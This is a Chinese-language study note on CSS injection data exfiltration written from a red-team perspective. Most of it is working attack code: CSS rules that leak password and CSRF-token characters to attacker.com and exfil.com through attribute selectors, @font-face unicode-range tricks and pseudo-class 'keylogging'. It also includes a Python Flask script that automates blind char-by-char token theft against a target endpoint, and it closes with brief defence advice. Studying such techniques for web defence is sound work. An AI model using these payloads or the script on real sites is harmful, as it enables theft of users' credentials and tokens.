## 目录

- [[#一、CSS数据泄露的核心原理|一、CSS数据泄露的核心原理]]
- [[#二、属性选择器泄露|二、属性选择器泄露]]
- [[#三、@font-face字体泄露|三、@font-face字体泄露]]
- [[#四、CSS键盘记录器|四、CSS键盘记录器]]
- [[#五、Scroll-to-Text泄露|五、Scroll-to-Text泄露]]
- [[#六、逐字符泄露（Blind Exfil）|六、逐字符泄露（Blind Exfil）]]
- [[#七、实际攻击案例|七、实际攻击案例]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、CSS数据泄露的核心原理

CSS没有文件读取能力，没有网络请求API，但可以利用**浏览器自动加载资源**的机制泄露数据：

```
1. 攻击者注入CSS规则
2. CSS规则中包含指向攻击者服务器的URL
3. 当CSS规则匹配到特定元素时，浏览器发起URL请求
4. 攻击者从服务器日志中获取URL参数 = 泄露的数据
```

核心：**将信息编码为URL路径，利用浏览器的自动请求行为对外传输**。

## 二、属性选择器泄露

### 原理

利用CSS属性选择器匹配input的value属性：

```css
/* 如果密码输入框的value以'a'开头，触发a.png */
input[name="password"][value^="a"] {
  background-image: url('https://attacker.com/exfil/a');
}

/* 如果以'b'开头，触发b.png */
input[name="password"][value^="b"] {
  background-image: url('https://attacker.com/exfil/b');
}
```

### 完整Payload（泄露CSRF Token）

```css
/* 假设CSRF Token是32位hex字符串 */
/* 第一轮：判断第1个字符 */
input[name="csrf"][value^="0"] { background: url(//exfil.com/0); }
input[name="csrf"][value^="1"] { background: url(//exfil.com/1); }
input[name="csrf"][value^="2"] { background: url(//exfil.com/2); }
input[name="csrf"][value^="3"] { background: url(//exfil.com/3); }
input[name="csrf"][value^="4"] { background: url(//exfil.com/4); }
input[name="csrf"][value^="5"] { background: url(//exfil.com/5); }
input[name="csrf"][value^="6"] { background: url(//exfil.com/6); }
input[name="csrf"][value^="7"] { background: url(//exfil.com/7); }
input[name="csrf"][value^="8"] { background: url(//exfil.com/8); }
input[name="csrf"][value^="9"] { background: url(//exfil.com/9); }
input[name="csrf"][value^="a"] { background: url(//exfil.com/a); }
input[name="csrf"][value^="b"] { background: url(//exfil.com/b); }
input[name="csrf"][value^="c"] { background: url(//exfil.com/c); }
input[name="csrf"][value^="d"] { background: url(//exfil.com/d); }
input[name="csrf"][value^="e"] { background: url(//exfil.com/e); }
input[name="csrf"][value^="f"] { background: url(//exfil.com/f); }

/* 第二轮：假设第一轮泄露了'a' */
input[name="csrf"][value^="a0"] { background: url(//exfil.com/a0); }
input[name="csrf"][value^="a1"] { background: url(//exfil.com/a1); }
/* ... */
```

### 优化：减少请求量

```css
/* 使用 :has() 选择器（现代浏览器） */
/* 一次性判断多个字符 */
html:has(input[name="csrf"][value^="a"]) {
  --leaked: url(//exfil.com/starts_with_a);
}
```

### 限制

1. 只能泄露元素**属性值**，不能读取文本内容
2. 需要知道目标元素的name/id
3. 逐字符需要大量请求（32位hex = 16×32 = 512次）
4. input的value变化时需重新注入CSS（但可通过@import递归）

## 三、@font-face字体泄露

### 原理

自定义字体的`unicode-range`属性可以指定字体覆盖的字符范围。浏览器只在页面包含该字符时才加载字体：

```css
@font-face {
  font-family: exfil;
  src: url('https://attacker.com/char/a');
  unicode-range: U+0061;  /* 'a' */
}
@font-face {
  font-family: exfil;
  src: url('https://attacker.com/char/b');
  unicode-range: U+0062;  /* 'b' */
}
span {
  font-family: exfil;
}
```

如果页面中含有字符'a'，浏览器会请求`/char/a`。

### 一键泄露页面文本内容

```css
/* 为每个常见字符注册自定义字体 */
@font-face { font-family: x; src: url(//exfil/a); unicode-range: U+61; }
@font-face { font-family: x; src: url(//exfil/b); unicode-range: U+62; }
/* ... 覆盖 a-z A-Z 0-9 ... */
* { font-family: x, sans-serif; }
```

### 优势与局限

优势：
- 可以直接泄露**文本内容**（而非属性值）
- 无需知道元素的name/id
- 一次性覆盖全页面

局限：
- 需要大量CSS规则（每个字符一条@font-face）
- 无法区分字符在哪个元素中
- 同一字符出现多次只触发一次请求（字体缓存）
- 只能泄露当前页面渲染后的文本

## 四、CSS键盘记录器

### 原理

CSS的伪类可以在特定状态下触发样式变化（包括请求URL）：

```css
/* 用户名输入框选择时触发 */
input[name="username"]:focus {
  background: url('https://attacker.com/focus/username');
}

/* 密码输入框获得焦点时触发 */
input[name="password"]:focus {
  background: url('https://attacker.com/focus/password');
}
```

更多利用用户交互的伪类：

| 伪类 | 触发时机 |
|------|---------|
| `:hover` | 鼠标悬停 |
| `:focus` | 获得焦点 |
| `:active` | 按下激活 |
| `:focus-within` | 自身或子元素获得焦点 |
| `:target` | 当前URL hash匹配id |

### 高级键盘记录思路

```css
/* 利用 input[value^="..."] + 逐字符判断 */
/* 用户每输入一个字符，触发一个请求 */
input[name="password"][value^="a"] { 
  background-image: url('https://attacker.com/key/password/a'); 
}
/* 结合 :focus-within 确保只在用户输入时触发 */
form:focus-within input[name="password"][value^="a"] { 
  background-image: url('https://attacker.com/key/password/a'); 
}
```

### 无需用户交互的键盘记录

利用 `@import` 递归查询 + `:has()` 选择器 + 持续刷新：

```html
<style>
  @import url('https://attacker.com/poll?step=1');
</style>
<!-- 服务端动态生成下一步的CSS规则 -->
<!-- 攻击者每5秒刷新一次@import，检查新的value值 -->
```

## 五、Scroll-to-Text泄露

### 原理

CSS Scroll-to-Text Fragment（`#:~:text=...`）配合`:target`伪类：

```
https://target.com/page#:~:text=secret_data
```

当页面滚动到包含"secret_data"的位置时，该区域会获得`:target`状态：

```css
:target {
  background-image: url('https://attacker.com/found/secret_data');
}
```

如果在iframe中加载目标页面并设置滚动片段，可检测目标页面是否包含特定文本。

## 六、逐字符泄露（Blind Exfil）

### 完整攻击流程

```
Phase 1: 发现CSS注入点
Phase 2: 构造逐字符选择器（如input[value^="x"]）
Phase 3: 注入第一轮规则（16个hex字符的多选）
Phase 4: 监听外泄服务器 → 收到第一个字符
Phase 5: 动态注入第二轮规则（已知前缀+下一个字符）
Phase 6: 重复直到泄露完整Token
Phase 7: 使用泄露的CSRF Token进行攻击
```

### 自动化脚本

```python
import time, requests
from flask import Flask, request

app = Flask(__name__)
known_prefix = ""
target_css_endpoint = "https://target.com/profile/theme"
alphabet = "0123456789abcdef"

def inject_css(prefix):
    rules = []
    for c in alphabet:
        rules.append(
            f'input[name="csrf"][value^="{prefix}{c}"] '
            f'{{ background-image: url(https://attacker.com/char/{prefix}{c}); }}'
        )
    payload = "} " + " ".join(rules) + " /*"
    requests.post(target_css_endpoint, json={"theme": payload})

@app.route('/char/<char>')
def receive_char(char):
    global known_prefix
    known_prefix = char
    print(f"[+] Leaked: {char}")
    return "body{}"

# 循环注CSS直到完整token泄露
while len(known_prefix) < 32:
    inject_css(known_prefix)
    time.sleep(3)  # 等待CSS加载、浏览器请求
```

## 七、实际攻击案例

### 案例1：Steam CSS注入（2019）

```
Vulnerability: Steam的社区市场允许自定义CSS主题
Impact: 泄露用户的交易报价、库存信息
Vector: input[name="wallet_currency"][value^="..."]{background:url(...)}
```

### 案例2：Gmail CSS注入（2018）

```
Vector: Gmail允许HTML邮件使用有限的CSS属性
但CSS选择器仍可向外部发起请求
导致：发件人可以判断收件人的某些邮件属性
```

### 案例3：CSS键记录器（2018 POC）

研究者利用`@font-face` + `unicode-range` 实现了纯CSS的键记录器，成功从React/DOM框架的页面中逐字符泄露密码输入。

## 八、红队视角总结

### CSS泄露技术速查

| 技术 | 泄露目标 | 需要条件 | 带宽 | 隐蔽性 |
|------|---------|---------|------|--------|
| 属性选择器 | 元素属性值 | 知道name/id | ~1字符/请求 | 中 |
| @font-face | 页面文本内容 | 无 | 1字符/字体 | 中高 |
| 伪类探测 | 用户交互行为 | 知道选择器 | 1事件/请求 | 高 |
| Scroll-to-Text | 特定文本存在性 | iframe嵌入 | 1bit/请求 | 高 |
| CSS变量泄露 | CSS变量值 | JS读取getComputedStyle | 中（需JS） | 中 |

### 防御建议

1. 对用户CSS使用**严格的CSS净化器**，移除`url()`和`@import`
2. **CSP**: `style-src 'self'` + 避免`'unsafe-inline'`
3. 敏感输入框的value属性使用动态更新（不依赖HTML attribute）
4. 隔离用户CSS到Shadow DOM
5. 对外部CSS资源的URL做白名单控制

---
**返回** [[CSS基础总目录|CSS基础总目录]] | [[../前端基础总目录|前端基础总目录]]
